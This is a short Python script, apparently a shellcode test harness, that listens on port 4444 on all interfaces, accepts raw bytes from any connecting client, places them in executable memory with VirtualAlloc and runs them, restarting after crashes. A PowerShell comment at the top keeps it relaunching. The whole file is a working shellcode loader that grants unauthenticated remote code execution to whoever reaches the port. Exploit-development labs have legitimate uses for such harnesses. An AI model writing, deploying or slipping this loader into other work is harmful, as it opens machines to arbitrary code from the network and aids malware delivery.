# while($true) { Write-Host "[+] Launching Server..."; python .\server.py -Wait; Write-Host "[!] Server crashed or exited. Restarting in 1s..."; Start-Sleep -s 1 }

import socket
import ctypes
import struct

# Constants for Windows Memory
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0x40

def run_server():
    # 1. Create Socket
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', 4444))
    server.listen(5)
    print("[*] 32-bit Shellcode Server listening on port 4444...")

    while True:
        try:
            client, addr = server.accept()
            print(f"[+] Connection from {addr}")

            # 2. Receive Shellcode
            shellcode = client.recv(4096)
            if not shellcode:
                client.close()
                continue

            print(f"[*] Received {len(shellcode)} bytes. Allocating memory...")

            # 3. Allocate Executable Memory (VirtualAlloc)
            # kernel32.VirtualAlloc(address, size, allocation_type, protect)
            ptr = ctypes.windll.kernel32.VirtualAlloc(
                ctypes.c_int(0),
                ctypes.c_int(len(shellcode)),
                ctypes.c_int(MEM_COMMIT | MEM_RESERVE),
                ctypes.c_int(PAGE_EXECUTE_READWRITE)
            )

            # 4. Copy Shellcode to Allocated Memory
            ctypes.memmove(ptr, shellcode, len(shellcode))

            # 5. Execute as a Function Pointer
            print(f"[!] Jumping to shellcode at {hex(ptr)}")
            shell_func = ctypes.CFUNCTYPE(None)(ptr)
            shell_func()

            client.close()
            print("[*] Shellcode finished execution. Ready for next...")

        except Exception as e:
            print(f"[!] Error or Crash: {e}")
            # The loop continues, keeping the server alive

if __name__ == "__main__":
    run_server()